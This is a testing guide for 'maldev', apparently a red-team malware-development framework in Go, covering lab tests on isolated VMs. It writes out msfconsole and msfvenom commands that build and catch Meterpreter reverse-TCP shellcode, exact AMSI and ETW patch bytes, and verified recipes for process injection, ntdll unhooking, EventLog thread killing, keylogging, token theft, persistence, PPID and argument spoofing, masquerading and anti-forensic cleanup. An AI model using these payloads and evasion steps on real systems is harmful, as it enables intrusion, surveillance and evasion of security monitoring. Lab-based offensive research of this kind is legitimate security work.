# Testing Guide — maldev

## Overview

The maldev project uses a multi-layered testing strategy:

1. **Unit tests** (`go test ./...`) — 64 packages, 500+ tests
2. **VM integration tests** (MALDEV_INTRUSIVE=1 MALDEV_MANUAL=1) — privileged operations in isolated VMs
3. **x64dbg binary verification** (scripts/vm-test-x64dbg-mcp.go) — 75 tests reading actual memory bytes via debugger
4. **Meterpreter end-to-end** (scripts/x64dbg-harness/meterpreter_matrix/) — real shellcode → real MSF sessions on Kali
5. **BSOD verification** (scripts/vm-test-bsod.go) — crashes VM, restores snapshot

## Running Tests

```bash
# Local (safe, non-intrusive)
go build $(go list ./...)
go test $(go list ./... | grep -v scripts) -count=1 -short

# VM — all tests including intrusive
./scripts/vm-run-tests.sh windows "./..." "-v -count=1"

# VM — with manual/dangerous tests
MALDEV_INTRUSIVE=1 MALDEV_MANUAL=1 go test ./... -count=1 -timeout 300s

# x64dbg binary verification (from host)
go run scripts/vm-test-x64dbg-mcp.go

# BSOD test (from host — crashes VM!)
go run scripts/vm-test-bsod.go

# Meterpreter matrix (from host, needs Kali)
# See Meterpreter section below
```

## Test Gating

| Environment Variable | Purpose |
|---------------------|---------|
| `MALDEV_INTRUSIVE=1` | Enable tests that modify system state (hooks, patches, injection) |
| `MALDEV_MANUAL=1` | Enable tests that need admin + VM (real shellcode, service manipulation) |
| `MALDEV_TEST_USER` | Username for impersonation tests |
| `MALDEV_TEST_PASS` | Password for impersonation tests |

## Injection CallerMatrix

Tests every injection method × every syscall calling convention. 35 combinations tested.

| Method | WinAPI | NativeAPI | Direct | Indirect | Type |
|--------|--------|-----------|--------|----------|------|
| CreateThread | ✅ | ✅ | ✅ | ✅ | Self |
| EtwpCreateEtwThread | ✅ | ✅ | ✅ | ✅ | Self |
| CreateRemoteThread | ✅ | ✅ | ✅ | ✅ | Remote |
| RtlCreateUserThread | ✅ | ✅ | ✅ | ✅ | Remote |
| QueueUserAPC | ✅ | ✅ | ✅ | ✅ | Remote |
| NtQueueApcThreadEx | ✅ | ✅ | ✅ | ✅ | Remote |
| EarlyBirdAPC | ✅ | ✅ | ✅ | ✅ | Spawn |
| ThreadHijack | ✅ | ✅ | ⚠️ | ⚠️ | Spawn |
| CreateFiber | ⛔ | ⛔ | ⛔ | ⛔ | Self |

- ⚠️ ThreadHijack + Direct/Indirect: `NtGetContextThread`/`NtWriteVirtualMemory` fail with STATUS_DATATYPE_MISALIGNMENT — RSP alignment issue in syscall stubs
- ⛔ CreateFiber: deadlocks Go's M:N scheduler with real shellcode

### Standalone Injection Functions

| Function | Meterpreter Tested | Notes |
|----------|-------------------|-------|
| SectionMapInject | ✅ SESSION_OK | Remote, uses Caller |
| KernelCallbackExec | ✅ SESSION_OK | Remote, no Caller |
| PhantomDLLInject | ✅ SESSION_OK | Remote, no Caller |
| ThreadPoolExec | ✅ SESSION_OK | Local, no Caller |
| ModuleStomp | ✅ SESSION_OK | Local, needs CreateThread for execution |
| ExecuteCallback (EnumWindows) | ✅ SESSION_OK | Local, synchronous |
| ExecuteCallback (TimerQueue) | ✅ SESSION_OK | Local, timer thread |
| ExecuteCallback (CertEnumStore) | ✅ SESSION_OK | Local, synchronous (Kali session 48 confirmed) |
| SpawnWithSpoofedArgs | ✅ SPOOF_OK | Process arg spoofing — real args executed, fake visible |

## Meterpreter End-to-End

### Prerequisites

1. Kali VM running with MSF (ssh -p 2223 kali@localhost)
2. Windows VM with Defender exclusions
3. SSH key at `/tmp/vm_kali_key`

### Setup

```bash
# Start MSF handler on Kali (sleep 3600 keeps it alive)
ssh -i /tmp/vm_kali_key -p 2223 kali@localhost \
  'nohup msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; set ExitOnSession false; exploit -j -z; sleep 3600" > /tmp/msf.log 2>&1 &'

# Wait 20s for MSF boot, then generate shellcode
ssh -i /tmp/vm_kali_key -p 2223 kali@localhost \
  'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f raw' > /tmp/msf_payload.bin

# Copy to VM
VBoxManage guestcontrol Windows10 copyto --target-directory "C:\Temp\" /tmp/msf_payload.bin
```

### Key Finding: MSF sleep trick

msfconsole exits when stdin closes (not a crash — EOF). `nohup`/`screen` don't help because they close stdin. Fix: add `sleep 3600` as the LAST MSF `-x` command. This is an MSF sleep (not bash), keeping the process alive while the handler runs.

### Results (2026-04-14)

22 unique meterpreter sessions established across all 21 injection techniques (including CertEnumStore). SpawnWithSpoofedArgs verified separately (not a shellcode injection — confirms PEB argument overwrite).

## Evasion Tests

### AMSI Patch

| Function | WinAPI | NativeAPI | Direct | Indirect | Bytes Verified |
|----------|--------|-----------|--------|----------|---------------|
| PatchScanBuffer | ✅ | ✅ | ✅ | ✅ | 31 C0 C3 (xor eax,eax; ret) |
| PatchOpenSession | ✅ | ✅ | ✅ | ✅ | Conditional jump flipped (JZ → JNZ) |
| PatchAll | ✅ | ✅ | ✅ | ✅ | Both ScanBuffer + OpenSession patched |

### ETW Patch

| Function | WinAPI | NativeAPI | Direct | Indirect | Bytes Verified |
|----------|--------|-----------|--------|----------|---------------|
| EtwEventWrite | ✅ | ✅ | ✅ | ✅ | 48 33 C0 C3 |
| EtwEventWriteEx | ✅ | ✅ | ✅ | ✅ | 48 33 C0 C3 |
| EtwEventWriteFull | ✅ | ✅ | ✅ | ✅ | 48 33 C0 C3 |
| EtwEventWriteString | ✅ | ✅ | ✅ | ✅ | 48 33 C0 C3 |
| EtwEventWriteTransfer | ✅ | ✅ | ✅ | ✅ | 48 33 C0 C3 |
| NtTraceEvent | ✅ | ✅ | ✅ | ✅ | 48 33 C0 C3 |

### Unhook

| Function | WinAPI | NativeAPI | Direct | Indirect | Verification |
|----------|--------|-----------|--------|----------|-------------|
| ClassicUnhook | ✅ | ✅ | ✅ | ✅ | Target: NtCreateSection, stub = 4C 8B D1 B8 |
| FullUnhook | ✅ | ✅ | ✅ | ✅ | All ntdll stubs = 4C 8B D1 B8 |

ClassicUnhook safelist: NtClose, NtCreateFile, NtReadFile, NtWriteFile, NtQueryVolumeInformationFile, NtQueryInformationFile, NtSetInformationFile, NtFsControlFile — all rejected to prevent Go runtime deadlock.

### Other Evasion

| Technique | Test | Verification |
|-----------|------|-------------|
| ACG Enable | TestACGBlocksRWX | VirtualAlloc(PAGE_EXECUTE_READWRITE) returns error after Enable() |
| BlockDLLs Enable | TestBlockDLLsPolicy | Process alive = policy set |
| Phant0m Kill | TestKillEventLogThreads | EventLog service threads terminated (TEB tag resolution) |
| Herpaderping Run | TestRunWithDecoy | Disk file = decoy content, not original payload |
| SleepMask Sleep | TestSleepMask_EncryptedDuringSleep | Bytes XOR-encrypted during sleep, restored after |
| AntiVM DetectVM | TestDetectVMInVirtualBox | Returns "VirtualBox" in VirtualBox VM |
| AntiVM DetectProcess | TestDetectVBoxProcess | Finds VBoxService.exe, VBoxTray.exe |

## BSOD

Tested via `scripts/vm-test-bsod.go`:
1. Launches harness via scheduled task (interactive session)
2. Harness calls `bsod.Trigger(nil)`
3. First tries `NtRaiseHardError` (intercepted on Win 10 22H2)
4. Falls back to `RtlSetProcessIsCritical(TRUE)` + `os.Exit(1)`
5. VM crashes with CRITICAL_PROCESS_DIED
6. Orchestrator restores INIT snapshot

## SSN Resolver Verification

All 4 resolvers return identical SSNs for the same function:

| Function | SSN | HellsGate | HalosGate | Tartarus | HashGate |
|----------|-----|-----------|-----------|----------|----------|
| NtAllocateVirtualMemory | 0x0018 | ✅ | ✅ | ✅ | ✅ |
| NtProtectVirtualMemory | 0x0050 | ✅ | ✅ | ✅ | ✅ |
| NtCreateThreadEx | 0x00C2 | ✅ | ✅ | ✅ | ✅ |
| NtClose | 0x000F | ✅ | ✅ | ✅ | ✅ |

Cross-validated: x64dbg reads SSN bytes from ntdll prologue (offset +4, +5) and compares with resolver output. All match.

## Collection

| Feature | Test | Verification |
|---------|------|-------------|
| Screenshot | TestCapture | PNG magic bytes 89 50 4E 47 |
| Screenshot bounds | TestDisplayBounds | Width/height > 0 |
| Clipboard read | TestReadText | No crash |
| Clipboard roundtrip | TestReadTextRoundtrip | Set-Clipboard → ReadText = exact match |
| Clipboard watch | TestWatch | Channel closes on context cancel |
| Keylog hook install | TestStart | Hook installs + channel open |
| Keylog capture | TestCaptureSimulatedKeystrokes | SendInput(VK_A) → KeyCode=0x41 |
| Keylog cancel | TestStartCancel | Channel closes on timeout |

## Token Operations

| Function | Test | Verification |
|----------|------|-------------|
| Steal (self) | TestStealSelf | Valid token from own PID |
| Steal (remote) | TestImpersonateTokenFromRemoteProcess | Steal notepad token + impersonate |
| OpenProcessToken | TestOpenProcessTokenSelf | Token handle non-zero |
| UserDetails | TestTokenUserDetails | Username non-empty |
| IntegrityLevel | TestTokenIntegrityLevel | Returns string (Medium/High/System) |
| Privileges | TestTokenPrivileges | At least one privilege listed |
| Enable/Disable | TestEnableDisablePrivilege | Round-trip toggle |
| ImpersonateToken | TestImpersonateToken | Token-based (no credentials) |

## Persistence

| Mechanism | Test | Verification |
|-----------|------|-------------|
| Registry Run key | TestSetAndGet + TestDelete | Full CRUD lifecycle (Set → Get → Exists → Delete) |
| Scheduler task | TestCreateAndDelete | Create → Exists=true → Delete → Exists=false |

## Cleanup

| Function | Test | Verification |
|----------|------|-------------|
| SelfDelete (script) | TestRunWithScriptInChild | Binary file removed from disk |
| Timestomp Set | TestSet | File mtime changed |
| Timestomp CopyFrom | TestCopyFrom | Destination times match source |
| Memory WipeAndFree | TestWipeAndFree | VirtualQuery returns MEM_FREE |

## PE Operations

| Function | Test | Verification |
|----------|------|-------------|
| BOF Load | TestLoad | Parses COFF headers, validates machine type |
| BOF Execute | TestExecuteNopBOF | Runs nop.o without crash |
| PE Parse | TestOpenValidPE | Sections, imports, exports parsed |
| PE Strip timestamp | TestSetTimestamp | Timestamp changed |
| PE Sanitize | TestSanitize | Pclntab F1FFFFFF wiped + sections renamed |
| PE Morph UPX | TestUPXMorph | Section names randomized |
| sRDI ConvertDLL | TestConvertDLL | Shellcode generated from DLL |

## Linux Testing

### Injection Methods

| Method | Test | Result | Verification |
|--------|------|--------|-------------|
| /proc/self/mem | TestProcMemSelfInject | ✅ | Child writes via /proc/self/mem, prints PROCMEM_OK |
| memfd_create | TestMemFDInject | ✅ | Creates anonymous fd, ForkExecs /bin/true ELF copy |
| ptrace | TestPtraceInject | ✅ | Spawns sleep target, attaches via ptrace, injects |
| purego (mmap+exec) | TestPureGoExec | ✅ | mmap RWX + direct call (no CGO) |
| procmem crash verify | TestProcMemVerification | ✅ | Injection → SIGSEGV = shellcode executed |

### Linux Debugger Equivalent

Instead of x64dbg, Linux verification uses:
- **`/proc/PID/maps`** — read memory layout, find RWX regions
- **`/proc/PID/mem`** — read/write process memory directly
- **GDB** (`gdb -p PID`) — available on Ubuntu VM for interactive debugging
- **strace** — trace syscalls (memfd_create, mmap, ptrace)

### Running Linux Tests

```bash
# On host (orchestrates VM)
./scripts/vm-run-tests.sh linux "./..." "-v -count=1"

# On Ubuntu VM directly
MALDEV_INTRUSIVE=1 MALDEV_MANUAL=1 go test $(go list ./... | grep -v scripts) -count=1 -timeout 120s

# Linux meterpreter e2e (requires Kali handler running first)
# From host: start MSF handler via KaliStartListener
# On Ubuntu VM:
MALDEV_MANUAL=1 MALDEV_INTRUSIVE=1 MALDEV_KALI_HOST=192.168.56.200 \
  go test -v -run TestMeterpreterRealSessionLinux ./c2/meterpreter/ -timeout 120s

# Linux shell PTY (self-contained, no Kali needed)
MALDEV_MANUAL=1 go test -v -run "TestShellPTYLinux" ./c2/shell/ -timeout 60s
```

### Linux e2e Results

| Test | Result | Notes |
|------|--------|-------|
| TestShellPTYLinux | ✅ PASS | PTY echo + command output verified |
| TestShellPTYLinuxLifecycle | ✅ PASS | Start/stop/reconnect lifecycle |
| TestMeterpreterRealSessionLinux | ✅ PASS | Session 1 opened on Kali (192.168.56.200:4444 → 192.168.56.103) |

### Platform Test Summary

| Platform | Packages OK | FAIL | Injection Methods | Meterpreter |
|----------|------------|------|-------------------|-------------|
| Windows 10 (VM) | 64 | 0 | 9 methods × 4 callers + 12 standalone | 22 sessions |
| Ubuntu 25.10 (VM) | 26 | 0 | 4 methods (procmem, memfd, ptrace, purego) | 1 session (Linux meterpreter) |

## PPID Spoofing

The `c2/shell` package includes a PPID spoofer (`PPIDSpoofer`) that creates child processes under a fake parent via `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`.

| Function | Test | Result | Notes |
|----------|------|--------|-------|
| ParentPID | TestParentPID | ✅ | Returns parent PID of current process |
| NewPPIDSpoofer | TestNewPPIDSpoofer | ✅ | Constructor, default targets |
| FindTargetProcess | TestPPIDSpooferFunctional | ⚠️ SKIP | Exploit Guard blocks CreateProcess with spoofed parent on Win 10 22H2 |
| SysProcAttr | TestPPIDSpooferSysProcAttrNoTarget | ✅ | Error on missing target |

**Known Limitation:** Windows 10 22H2 blocks `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` with ACCESS_DENIED even with admin + SeDebugPrivilege + no ASR rules configured. This appears to be a kernel-level mitigation (not ASR/Exploit Guard). OpenProcess(PROCESS_CREATE_PROCESS) succeeds, but CreateProcess with the spoofed parent fails. The technique works on older Windows versions without these protections.

## Sprint 2 Additions (2026-04-15)

Three new feature packages + one doc overhaul were battle-tested this
session. Host runs and VM runs both captured; bugs fixed on the spot.

### inject callbacks — 3 new execution methods

| Method                              | Test                                          | Result | Fix landed during session |
|-------------------------------------|-----------------------------------------------|--------|---------------------------|
| CallbackReadDirectoryChanges        | TestExecuteCallbackReadDirectoryChanges       | PASS   | –                         |
| CallbackRtlRegisterWait             | TestExecuteCallbackRtlRegisterWait            | PASS   | WT_EXECUTEONLYONCE + RtlDeregisterWaitEx(INVALID_HANDLE_VALUE) to avoid post-free callback crash |
| CallbackNtNotifyChangeDirectory     | TestExecuteCallbackNtNotifyChangeDirectory    | PASS   | STATUS_PENDING(0x103) accepted as success; Win11 CET stub requires endbr64 prefix |

Allocator helper moved to `testutil.WindowsCETStubX64` (shared CET-safe
`endbr64;ret` shellcode; required by Win11 KiUserApcDispatcher).

### persistence/scheduler — COM ITaskService rewrite

| Test                          | Result | Notes                                             |
|-------------------------------|--------|---------------------------------------------------|
| TestCreateAndDelete           | PASS   | RegisterTaskDefinition + DeleteTask round-trip    |
| TestCreateWithTimeAndDelete   | PASS   | TIME trigger                                      |
| TestDeleteNonExistent         | PASS   | Error surface                                     |
| TestCreateRequiresAction      | PASS   | Option validation                                 |
| TestSplitTaskName             | PASS   | Unit test for path parsing                        |
| TestScheduledTaskMechanism    | PASS   | persistence.Mechanism interface                   |
| TestExistsNonExistent         | PASS   | Non-admin returns false cleanly                   |
| TestRunNonExistent            | PASS   | Error surface                                     |
| TestList                      | PASS   | Root-folder enumeration                           |

Two bugs fixed during the VM run: `ole.NewVariant(VT_NULL)` → `nil`
(oleutil marshaller panic), and `StartBoundary` now always set (Task
Scheduler rejects DAILY triggers without it).

### pe/clr — in-process .NET hosting

| Test                                       | Result        | Gate                              |
|--------------------------------------------|---------------|-----------------------------------|
| TestInstalledRuntimes                      | PASS          | always                            |
| TestLoadAndClose                           | SKIP*         | ICorRuntimeHost unavailable       |
| TestExecuteAssemblyEmpty                   | SKIP*         | ICorRuntimeHost unavailable       |
| TestExecuteDLLValidation                   | SKIP*         | ICorRuntimeHost unavailable       |
| TestInstallAndRemoveRuntimeActivationPolicy | PASS          | always                            |

`Load()` tries `CorBindToRuntimeEx` first, falls back to
CLRCreateInstance+BindAsLegacyV2Runtime. The three `Load`-dependent tests
run inside a **separate** helper binary — `testutil/clrhost/` — built on
demand with a committed `<exe>.config` that enables legacy v2 activation.
`testutil.RunCLROperation` spawns the helper, inspects its exit code, and
maps environmental failures (exit=2, "ICorRuntimeHost unavailable") to
`t.Skip` so the test suite stays green.

> **\* Observed behaviour on Win10 build 19045.6466 + NetFx3 Enabled**:
> even with the committed `.config` and a fresh unmanaged helper process,
> `GetInterface(CorRuntimeHost)` still returns `REGDB_E_CLASSNOTREG`. The
> three SKIPs therefore remain on this specific Windows build. The
> infrastructure is in place for the moment Microsoft restores legacy
> activation paths, or when running on an environment that does — older
> Win10 builds, LTSC images, .NET-aware manifested hosts, etc.

Runtime helpers for operational use:

- `clr.InstallRuntimeActivationPolicy()` drops `<exe>.config` next to the
  running binary before `Load`.
- `clr.RemoveRuntimeActivationPolicy()` deletes it after `Load` succeeds
  (mscoree has cached the policy — file no longer needed, OPSEC cleanup).

### evasion/cet — CET shadow-stack manipulation

| Test | Result | Notes |
|------|--------|-------|
| TestMarker | PASS | Verifies Marker == ENDBR64 opcode |
| TestWrapIdempotent | PASS | Double-wrap is no-op |
| TestWrapEmpty | PASS | nil input → just Marker |
| TestWrapAlreadyCompliant | PASS | sc starting with ENDBR64 unchanged |

`cet.Enforced()` / `cet.Disable()` are environment-dependent and not
unit-asserted — verified manually on the Win10 VM (returns false; no CET
enforcement on this CPU/image combo). Unit-testable on a Win11+CET host.

### pe/masquerade — compile-time PE resource embedding (T1036.005)

End-to-end validation via `pe/masquerade/internal/e2e_cmd_test`:

| Step                                | Result                                                        |
|-------------------------------------|---------------------------------------------------------------|
| Generator read-only scan of System32 | PASS (5 identities × 2 UAC variants = 10 sub-packages)       |
| Blank-import → `go build`            | PASS (syso auto-linked)                                       |
| VERSIONINFO match                    | PASS — `Get-Item masqtest.exe` shows CompanyName "Microsoft Corporation", OriginalFilename "Cmd.Exe", full cmd.exe metadata |

### process/session — WTS enumeration

| Test                     | Result | VM observation                                       |
|--------------------------|--------|------------------------------------------------------|
| TestList                 | PASS   | Services(id=0,Disconnected) + Console(id=1,Active,test@DESKTOP-T8IB37P) |
| TestActiveSubsetOfList   | PASS   | invariant Active ⊆ List                              |
| TestSessionStateString   | PASS   | enum→name mapping                                    |

### Windows 11 CET gotcha

`KiUserApcDispatcher` rejects non-endbr64 indirect targets with
`STATUS_STACK_BUFFER_OVERRUN (0xC000070A)`. Any future test that
allocates a shellcode stub for an APC path must start with `F3 0F 1E FA`
(endbr64). Use `testutil.WindowsCETStubX64`.

## Sprint 2 Extensions (2026-04-15)

Five additional packages landed on top of the Sprint 2 base. All tested
on host and on Windows10 VM (snapshot INIT restored between runs).

### c2/transport — server-side Listener interface

Adds `Listener`, `NewTCPListener`, `NewTLSListener` as the symmetric of
`Transport` for operator-side reverse-shell handlers. Thin wrappers over
`net.Listen` / `tls.Listen` with context-cancelable `Accept`.

Tests (11 PASS, 1 SKIP in loopback race):
`TestTCPRoundTrip`, `TestTCPReconnect`, `TestTCPRemoteAddr`,
`TestTCPContextCancel` (SKIP: loopback accepts before ctx fires),
`TestTCPContextCancelNonRoutable` (non-routable addr forces the cancel
path), `TestNewTLS_Options`, `TestWithFingerprint`,
`TestNewUTLS_Options`, plus malleable HTTP tests.

### c2/multicat — multi-session reverse-shell manager

Operator-side listener that multiplexes inbound shells into numbered
sessions, reads an optional `BANNER:<hostname>\n` within 500 ms, and
emits lifecycle events on a buffered channel. Never embedded in the
implant.

MITRE: T1571.

Tests (6 PASS, in-memory with `net.Pipe`):
`TestListenAccept`, `TestSessionsIDSequential`, `TestBannerHostname`,
`TestRemoveSession`, `TestEvents`, `TestGet`. Tests write `"\n"` from
the client side to unblock the 500 ms banner-read deadline so the
session registers before `Sessions()` snapshot.

### crypto — lightweight obfuscation primitives

Non-cryptographic but signature-breaking transforms: **TEA**, **XTEA**
(8-byte block, 16-byte key, 64 rounds, PKCS7), **ArithShift**
(position-dependent byte add), **S-Box** (random 256-byte permutation +
inverse via Fisher-Yates on `crypto/rand`), and **MatrixTransform** /
"Agent Smith" (Hill cipher mod 256, n∈{2,3,4}, adjugate inverse).

MITRE: T1027 / T1027.013.

Tests: `TestTEARoundtrip`, `TestXTEARoundtrip`,
`TestArithShiftRoundtrip`, `TestSBoxRoundtrip`,
`TestMatrixTransformRoundtrip` (iterates n=2,3,4). All PASS on host + VM.

**Gotcha:** a compile-time `uint32(teaDelta * rounds/2)` overflows the
untyped-constant range in Go. The runtime sum loop `for j { sum += teaDelta }`
replaces it. `matDet` needs an explicit `n == 1` case for 2×2 matrix
inversion (recursive cofactor minors land at 1×1).

### evasion/fakecmd — SpoofPID remote PEB overwrite

Extends the existing self-spoof to a remote process. Opens the target
with `PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
PROCESS_QUERY_INFORMATION`, walks PEB→ProcessParameters→CommandLine,
allocates a new UTF-16 buffer in the target with
`NtAllocateVirtualMemory`, writes the fake string, and patches
`Length` / `MaximumLength` / `Buffer` of the UNICODE_STRING in place.
No Restore counterpart — the caller tracks the original.

Signature accepts an optional `*wsyscall.Caller` that routes both
`NtQueryInformationProcess` and `NtAllocateVirtualMemory`.

MITRE: T1036.005.

Test: `TestSpoofPID` (PASS, VM elevated). Spawns notepad, calls
`SpoofPID(pid, fake, nil)`, then reads the remote PEB back via
`readRemoteCmdLine` and asserts equality. Skipped on host when not
running as admin via `testutil.RequireAdmin`.

### encode — markdown documentation page

No new Go code. Creates `docs/techniques/encode/README.md` covering
Base64/Base64URL/UTF-16LE/PowerShell/ROT13, when to encode vs encrypt,
and the `encrypt → encode` layering pattern. All existing `encode`
tests continue to PASS.

### VM Infra Fixes Landed With This Sprint

- **Persistent shared folder** `maldev` on Windows10 VM with `--automount
  --auto-mount-point "Z:"` so `Z:\scripts\vm-test.ps1` resolves.
- **`vm-test.ps1` tolerates comma-separated `-Packages`** because
  `VBoxManage guestcontrol` drops internal whitespace from `--` args;
  multi-package runs must pass a single `./...` glob, commas, or invoke
  the runner once per package.

## Known Limitations

| Issue | Impact | Workaround |
|-------|--------|-----------|
| CreateFiber deadlocks Go scheduler | Cannot test with real shellcode in `go test` | Use standalone binary |
| ThreadHijack + Direct/Indirect | RSP alignment breaks NtGetContextThread | Use WinAPI or NativeAPI |
| Phant0m depends on EventLog state | May skip if threads untagged | Run immediately after VM restore |
| Clipboard needs Session 1 | guestcontrol = Session 0 | Run via scheduled task |
| Keylog singleton | Must wait 500ms between Start() calls | Sleep after cancel |
| findallmem after x64dbg attach | Returns 0 results | Use InitDebug or self-scan |
| Syscall stubs transient | Freed after Caller GC | Scan during execution, not after |
| MSF exits on stdin EOF | Handler dies after -r/-x commands | Add `sleep 3600` as last -x command |
| PPID spoofing blocked | Kernel-level mitigation on Win 10 22H2 (not ASR) | Test on older OS or disable kernel mitigations |
| Ubuntu no host-only NIC | Cannot reach Kali for meterpreter | Add nic2 hostonly (requires VM shutdown) — **DONE** |
| KaliSSH inside VMs | `localhost:2223` unreachable from other VMs | Use direct host-only IPs or env vars (MALDEV_KALI_HOST) |
| Kali DHCP IP mismatch | KaliHost=192.168.56.200, DHCP assigns .101 | `sudo ip addr add 192.168.56.200/24 dev eth1` |
